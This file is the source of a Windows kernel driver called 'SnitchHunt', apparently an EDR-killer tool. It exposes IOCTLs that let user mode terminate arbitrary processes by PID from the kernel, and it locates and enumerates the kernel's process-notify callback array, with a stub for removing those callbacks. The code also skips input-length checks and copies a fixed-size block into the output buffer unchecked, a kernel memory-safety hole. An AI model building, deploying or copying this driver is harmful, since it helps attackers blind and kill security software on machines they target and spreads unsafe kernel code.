#include "utils.h"

void UnloadMe(PDRIVER_OBJECT);
NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP);
NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP);
//UINT64 FindKernelBase();
//UINT64 FindProcNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);


// Handle IRP_MJ_CREATE and IRP_MJ_CLOSE
NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


void UnloadMe(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\SnitchHunt");

    IoDeleteSymbolicLink(&symLink);             // Remove user-mode access path
    IoDeleteDevice(DriverObject->DeviceObject); // Delete the device object

    DbgPrintEx(0, 0, "[%s] Driver has been Unloaded.\n", DRIVER_NAME);
    DbgPrint("Bye Bye from HelloWorld Driver\n");
}


NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;

    switch (controlCode) {
    case IOCTL_KILL_PROCESS:
    {
        //if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(ULONG_PTR) ||
        //    Irp->AssociatedIrp.SystemBuffer == NULL) {
        //    status = STATUS_BUFFER_TOO_SMALL;
        //    break;
        //}

        ULONG_PTR pidVal = *(ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;

        HANDLE hProcess = NULL;
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;

        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        cid.UniqueProcess = (HANDLE)pidVal;
        cid.UniqueThread = NULL;

        status = ZwOpenProcess(&hProcess, 1, &oa, &cid);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[%s] ZwOpenProcess failed for PID %llu (0x%08X)\n",
                DRIVER_NAME, (unsigned long long)pidVal, status);
            break;
        }

        status = ZwTerminateProcess(hProcess, STATUS_SUCCESS);
        if (!NT_SUCCESS(status)) {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[%s] ZwTerminateProcess failed for PID %llu (0x%08X)\n",
                DRIVER_NAME, (unsigned long long)pidVal, status);
        }
        else {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "[%s] Terminated PID %llu\n",
                DRIVER_NAME, (unsigned long long)pidVal);
        }

        ZwClose(hProcess);
        break;
    }
    case IOCTL_REM_PROC_CALLBACK:
    {
        // Placeholder for listing process callbacks
        UINT64 kernelBase = FindKernelBase();
        if (!kernelBase) {
            DbgPrintEx(0, 0, "[%s] Failed to find kernel base\n", DRIVER_NAME);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        ULONG64 procNotifyArrayAddr = FindProcNotifyRoutineAddress(kernelBase, ImageLoadCallback);
        if (!procNotifyArrayAddr) {
            DbgPrintEx(0, 0, "[%s] Failed to find process notify routine address\n", DRIVER_NAME);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);

        DbgPrintEx(0, 0, "[%s] Process Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, procNotifyArrayAddr);

        EnumProcRegisteredDrivers(procNotifyArrayAddr);

        // send back packet with base address of procNotifyArrayAddr
        ULONG_PTR* outputBuffer = (ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
        if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
            *outputBuffer = procNotifyArrayAddr;
            info = sizeof(ULONG_PTR);
            status = STATUS_SUCCESS;
        }
        else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;
	}
    case IOCTL_LIST_PROC_CALLBACK:
    {
        // Placeholder for listing process callbacks
        UINT64 kernelBase = FindKernelBase();
        if (!kernelBase) {
            DbgPrintEx(0, 0, "[%s] Failed to find kernel base\n", DRIVER_NAME);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        ULONG64 procNotifyArrayAddr = FindProcNotifyRoutineAddress(kernelBase, ImageLoadCallback);
        if (!procNotifyArrayAddr) {
            DbgPrintEx(0, 0, "[%s] Failed to find process notify routine address\n", DRIVER_NAME);
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);

        DbgPrintEx(0, 0, "[%s] Process Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, procNotifyArrayAddr);

        ModulesDataArray modules = EnumProcRegisteredDrivers(procNotifyArrayAddr);

		// prima ritorno il numero di moduli cosi' che l'user mode allochi il buffer giusto
		ULONG_PTR* outputBuffer = (ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
        SIZE_T neededSize = sizeof(ModulesData) * 64;

		DbgPrintEx(0, 0, "Number of valid modules: %llu\n", (unsigned long long)modules.Count);

		memcpy(outputBuffer, &modules, neededSize);

        if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
            //*outputBuffer = modules;
            status = STATUS_SUCCESS;
            break;
        }
        else {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        

        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[%s] Invalid IOCTL 0x%08X\n", DRIVER_NAME, controlCode);
        break;
    }

    // Complete the IRP
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info; // bytes returned (0 here)
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	
	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(0, 0, "[%s] SnitchHunter started hunting snitches. Callback on deez nutz loosers\n", DRIVER_NAME);


	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;

	// Unload Function
	DriverObject->DriverUnload = UnloadMe;


	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\SnitchHunt");

	PDEVICE_OBJECT DeviceObject;

	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&devName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "[%s] Failed to create device (0x%X)\n", DRIVER_NAME, status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\SnitchHunt");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		DbgPrintEx(0, 0, "[%s] Failed to create symbolic link (0x%X)\n", DRIVER_NAME, status);
		return status;
	}

	return STATUS_SUCCESS;
}
